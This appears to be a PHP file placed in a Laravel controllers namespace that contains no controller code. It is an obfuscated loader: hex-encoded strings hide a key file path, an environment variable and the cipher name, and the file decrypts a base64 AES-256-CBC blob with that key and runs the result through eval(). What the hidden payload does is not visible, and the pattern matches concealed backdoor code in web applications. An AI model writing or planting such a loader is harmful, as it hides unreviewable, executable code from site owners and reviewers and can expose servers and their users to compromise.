<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('yb8V0ue6TiGIyCi7sIMR8g==');

$c=base64_decode(

'bULgH9WfdEcwjMC6jOHqoAKgWCplDj61kFtTcvqrvJUQ7Pok8WxdV5NRW0+xy7F1HmeeFPRdwDUm' .
'A5kyd9XEfh301zG+MsMj1/+wiVRj2iI6Ggu+cn6jks13522YmeNCd4e0cLYMiERePmWNe4Z93TSZ' .
'FeswvjzfjoWqvPrPXG13wJwu8qNfx7fAqEsMKSP9pc60dlm31FnlW2qJJF9/V7GplZJU6Vq/fY+Z' .
'dPqsDR2PY4TiolhIjXOj4UyQJRM8'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

